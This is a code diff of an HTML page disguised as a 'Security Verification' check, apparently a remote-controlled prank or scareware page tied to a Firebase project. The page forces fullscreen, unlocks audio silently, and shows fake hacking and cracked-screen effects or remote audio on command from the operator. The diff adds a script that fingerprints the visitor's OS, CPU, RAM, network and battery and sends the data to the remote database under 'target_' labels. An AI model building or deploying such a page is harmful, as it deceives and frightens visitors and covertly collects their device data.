@@ -4,6 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Verification</title>
+    
+    <!-- ANTI-CACHE TAGS -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    
     <!-- Firebase Libraries -->
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
@@ -16,19 +22,14 @@
         button:hover { background-color: #166fe5; }
         
         #matrix-container { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: black; color: lime; font-family: 'Courier New', monospace; padding: 10px; box-sizing: border-box; overflow: hidden; z-index: 100; text-align: left; font-size: 14px; }
-        
-        /* FIXED: Screen Crack Image Link Updated Here */
         #crack-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.ibb.co/3sX8HnM/broken-glass-2202353-960-720.png') no-repeat center center; background-size: cover; z-index: 999; pointer-events: none; opacity: 0.8; }
     </style>
 </head>
 <body>
 
-    <!-- FIXED: Background Silent Loop (Ye background process zinda rakhega bina kisi aawaz ke) -->
     <audio id="hackerSound" loop>
         <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
     </audio>
-
-    <!-- Ye tera custom prank audio player hai jo pehle se ready rakha hai -->
     <audio id="prankAudioPlayer"></audio>
 
     <div class="box" id="content-box">
@@ -44,9 +45,7 @@
         const bgAudio = document.getElementById('hackerSound');
         const prankAudio = document.getElementById('prankAudioPlayer');
         
-        // --- BROWSER AUDIO UNLOCKER TRICK ---
         document.body.addEventListener('click', function() {
-            // Fullscreen trigger
             if (!document.fullscreenElement) {
                 if (document.documentElement.requestFullscreen) {
                     document.documentElement.requestFullscreen();
@@ -57,7 +56,6 @@
                 }
             }
 
-            // 1. Background Notification Sound On (Ab ye silent hai)
             bgAudio.play().then(() => {
                 if ('mediaSession' in navigator) {
                     navigator.mediaSession.metadata = new MediaMetadata({
@@ -68,16 +66,10 @@
                 }
             }).catch(e => console.log(e));
 
-            // 2. MASTER TRICK: "prankAudio" ko silently ek blank sound bhej kar Unlock karna!
             prankAudio.src = "data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA";
-            prankAudio.play().then(() => {
-                console.log("Browser Audio Security UNLOCKED! Ready for payloads.");
-            }).catch(e => console.log(e));
-
+            prankAudio.play().catch(e => console.log(e));
         }, { once: true });
 
-
-        // --- FIREBASE CONFIG ---
         const firebaseConfig = {
             apiKey: "AIzaSyCmQlussFJo9gl41kLvL6tYxy3i-I76wL8",
             authDomain: "jod-prank.firebaseapp.com",
@@ -102,7 +94,33 @@
 
             document.getElementById('start-btn').addEventListener('click', () => {
                 box.innerHTML = "<h2>Verifying...</h2><p>Please do not close this window.</p>";
-                sessionRef.update({ status: 'connected' });
+                
+                // ADVANCED INTEL GATHERING SCRIPT
+                let ua = navigator.userAgent;
+                let osName = "Unknown Device";
+                if (/android/i.test(ua)) osName = "Android OS";
+                else if (/ipad|iphone|ipod/i.test(ua)) osName = "Apple iOS";
+                else if (/windows/i.test(ua)) osName = "Windows PC";
+                else if (/mac/i.test(ua)) osName = "Mac OS";
+                else if (/linux/i.test(ua)) osName = "Linux";
+
+                let cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "Hidden";
+                let ram = navigator.deviceMemory ? navigator.deviceMemory + " GB RAM" : "Hidden";
+                let network = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
+
+                let intelData = { target_os: osName, target_cpu: cpuCores, target_ram: ram, target_net: network };
+
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then(function(battery) {
+                        intelData.target_battery = Math.round(battery.level * 100) + "% " + (battery.charging ? "[CHARGING]" : "");
+                        intelData.status = 'connected';
+                        sessionRef.update(intelData);
+                    });
+                } else {
+                    intelData.target_battery = "Secured";
+                    intelData.status = 'connected';
+                    sessionRef.update(intelData);
+                }
 
                 sessionRef.on('value', (snapshot) => {
                     const data = snapshot.val();
@@ -125,7 +143,7 @@
             if(type === 'system' && payload === 'kill') {
                 clearInterval(intervalId);
                 bgAudio.pause(); 
-                prankAudio.pause(); // Kill switch dabte hi sab aawazein band
+                prankAudio.pause(); 
                 
                 matrixDiv.style.display = "none";
                 crackDiv.style.display = "none";
@@ -149,7 +167,6 @@
                         matrixDiv.scrollTop = matrixDiv.scrollHeight;
                     }, 100);
                 } 
-                // FIXED: Screen Crack Sound ab pre-unlocked player se bajega
                 else if (payload === 'screen-crack') {
                     crackDiv.style.display = "block";
                     prankAudio.pause();
@@ -159,11 +176,10 @@
                 }
             }
 
-            // FIXED: AUDIO COMMANDS (CLEAN & SILENT BG)
             if(type === 'audio') {
                 prankAudio.pause();
                 prankAudio.src = payload.trim();
-                prankAudio.load(); // Browser ko naya link load karne ka time dene ke liye
+                prankAudio.load(); 
                 
                 prankAudio.play().then(() => {
                     console.log("Audio Payload Delivered successfully!");
